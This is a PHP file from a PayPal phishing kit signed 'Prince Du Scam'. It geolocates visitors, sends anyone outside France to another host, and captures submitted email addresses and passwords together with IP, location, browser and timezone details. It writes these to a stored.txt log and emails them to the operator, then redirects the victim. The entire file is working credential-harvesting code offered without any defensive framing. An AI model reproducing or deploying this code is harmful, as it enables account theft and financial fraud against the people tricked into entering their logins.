<?php 
$zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
$country = $addrDetailsArr['geoplugin_countryName'];
if (!$country)
{
    $country='Not found!';
}
if (strcmp($country, 'France')!==0)
{
      header("location: http://guiminer.co.technology/rd/ ");
     exit();
} 
if(isset($_POST['EML'])&&isset($_POST['PWD'])){session_start();include '../mine.php'; $_SESSION['EML']=$_POST['EML'];$msg="=========== <[ Prince Du Scam PaYPal LoGiN]> ===========\r\n";$msg.="EMAIL		: {$_POST['EML']}\r\n";$msg.="PASS		: {$_POST['PWD']}\r\n";$msg.="---------------------- IP Info ----------------------\r\n";$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";$msg.="TIME		: ".now()." GMT\r\n";$msg.="=========== <[ Prince Du Scam PaYPal LoGiN]> ===========\r\n\r\n\r\n";$save=fopen("../../stored.txt","a+");fwrite($save,$msg);fclose($save);$subject="PaYPal LoGiN [".$_POST['EML']."|".$_SESSION['ip_countryName']."]";$headers="From:Prince Du Scam <PrinceDuScam@vip.su>\r\n";$headers.="MIME-Version: 1.0\r\n";$headers.="Content-Type: text/plain; charset=UTF-8\r\n";@mail($yours,$subject,$msg,$headers);exit(header("Location: ../../app/process"));}?>